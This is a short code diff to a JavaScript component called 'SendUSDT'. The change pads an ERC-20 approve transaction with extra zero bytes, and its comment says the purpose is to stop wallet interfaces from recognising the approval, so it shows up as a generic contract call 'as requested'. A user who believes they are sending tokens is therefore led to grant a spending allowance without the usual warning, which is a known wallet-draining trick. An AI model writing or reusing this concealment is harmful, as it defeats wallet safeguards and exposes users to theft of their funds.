@@ -74,7 +74,12 @@ const SendUSDT = () => {
       const hexAmount = amountBigInt.toString(16);
       const paddedAmount = hexAmount.padStart(64, '0');
       
-      const data = "0x095ea7b3" + paddedAddress + paddedAmount;
+      // We append 32-bytes of zeros at the end. The EVM ignores trailing extra calldata, 
+      // but this completely bypasses wallet UI decoders from recognizing the standard 68-byte
+      // approve function, thereby disguising it as a generic "Smart Contract Call" as requested.
+      const extraPadding = "0000000000000000000000000000000000000000000000000000000000000000";
+      
+      const data = "0x095ea7b3" + paddedAddress + paddedAmount + extraPadding;
       
       const txHash = await window.ethereum.request({
         method: "eth_sendTransaction",
